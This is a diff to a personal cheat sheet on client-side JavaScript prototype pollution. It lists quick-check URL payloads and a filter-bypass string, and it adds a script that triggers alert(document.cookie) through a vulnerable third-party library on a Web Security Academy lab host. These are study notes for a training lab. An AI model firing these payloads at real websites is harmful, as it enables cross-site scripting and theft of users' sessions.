@@ -58,10 +58,10 @@
 ### Via the constructor
 	- sometimes the `__proto__` accessor is blocked, we maybe able to use `constructor` property.
 ### quick check
-https://example.com/?__proto__[foo]=bar
-https://example.com/?__proto__.foo=bar
-https://example.com/?constructor.[prototype][foo]=bar
-https://example.com/?constructor.prototype.foo=bar
+https-//example.com/?__proto__[foo]=bar
+https-//example.com/?__proto__.foo=bar
+https-//example.com/?constructor.[prototype][foo]=bar
+https-//example.com/?constructor.prototype.foo=bar
 # Bypass sanitization
 https-//example.com/?__pro__proto__to__[foo]=bar`
 
@@ -91,4 +91,8 @@ https-//example.com/?__proto__[source_url]=alert(1)-
 
 source_url can be [transport_url]
 
-
+# vulnerable 3rd party library
+<script>
+    location="https://0a1c00af03786a9a80204452004a00a7.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
+</script>
+Here 0a1c00af03786a9a80204452004a00a7.web-security-academy.ne is vulnerable
